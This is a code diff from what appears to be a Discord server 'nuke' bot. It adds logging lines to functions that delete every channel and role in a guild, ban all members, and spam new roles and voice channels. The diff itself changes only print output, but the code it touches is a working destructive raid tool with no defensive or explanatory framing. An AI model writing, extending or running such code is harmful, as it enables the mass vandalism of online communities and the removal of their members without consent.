@@ -31,6 +31,7 @@ async def delete_all_channel(guild):
         try:
             await channel.delete()
             deleted += 1
+            print(deleted, " ",channel," channel got deleted")
         except:
             continue
     return deleted
@@ -41,6 +42,7 @@ async def delete_all_roles(guild):
         try:
             await role.delete()
             deleted += 1
+            print(deleted, " ",role," role got deleted")
         except:
             continue
     return deleted
@@ -51,6 +53,7 @@ async def ban_all_members(guild):
         try:
             await member.ban()
             banned += 1
+            print(banned, " ",member," got banned")
         except:
             continue
     return banned
@@ -62,6 +65,7 @@ async def create_roles(guild, name):
         try:
             await guild.create_role(name=name)
             created += 1
+            print(created, " ",name," role got created")
         except:
             continue
     return created
@@ -72,6 +76,7 @@ async def create_voice_channels(guild, name):
         try:
             await guild.create_voice_channel(name=name)
             created += 1
+            print(created, " ",name," channel got created")
         except:
             continue
     return created
